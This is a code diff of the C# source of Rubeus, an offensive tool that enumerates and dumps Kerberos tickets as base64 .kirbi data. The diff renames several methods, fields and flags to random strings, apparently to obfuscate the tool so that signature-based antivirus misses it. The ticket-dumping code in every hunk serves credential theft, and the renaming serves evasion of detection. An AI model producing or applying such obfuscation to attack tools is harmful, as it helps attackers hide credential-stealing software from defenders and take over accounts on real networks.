@@ -214,7 +214,7 @@ namespace Rubeus
             return ticketKirbi;
         }
 
-        public static List<SESSION_CRED> EnumerateTickets(bool extractTicketData = false, LUID targetLuid = new LUID(), string targetService = null, string targetUser = null, string targetServer = null, bool includeComputerAccounts = true, bool silent = false)
+        public static List<SESSION_CRED> ahghiS7ahh(bool extractTicketData = false, LUID targetLuid = new LUID(), string targetService = null, string targetUser = null, string targetServer = null, bool includeComputerAccounts = true, bool silent = false)
         {
             //  Enumerates Kerberos tickets with various targeting options
 
@@ -359,7 +359,7 @@ namespace Rubeus
                         // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                         ticketCacheResponse = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(
                             (System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
-                        var count2 = ticketCacheResponse.CountOfTickets;
+                        var count2 = ticketCacheResponse.ziepeoz1Su;
 
                         if (count2 != 0)
                         {
@@ -549,7 +549,7 @@ namespace Rubeus
                 Console.WriteLine("{0}Flags                 :  {1}", indent, flags);
                 Console.WriteLine("{0}Base64EncodedTicket   :\r\n", indent);
 
-                if (Rubeus.Program.wrapTickets)
+                if (Rubeus.Program.jafaey5Coo)
                 {
                     foreach (var line in Helpers.Split(base64ticket, 100))
                     {
@@ -579,7 +579,7 @@ namespace Rubeus
                 {
                     // if we're displaying the base64 encoding of the ticket
                     Console.WriteLine("{0}Base64EncodedTicket   :\r\n", indent);
-                    if (Rubeus.Program.wrapTickets)
+                    if (Rubeus.Program.jafaey5Coo)
                     {
                         foreach (var line in Helpers.Split(base64ticket, 100))
                         {
@@ -1233,7 +1233,7 @@ namespace Rubeus
                                                             {
                                                                 Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
 
-                                                                if (Rubeus.Program.wrapTickets)
+                                                                if (Rubeus.Program.jafaey5Coo)
                                                                 {
                                                                     // display the .kirbi base64, columns of 80 chararacters
                                                                     foreach (var line in Helpers.Split(kirbiString, 80))
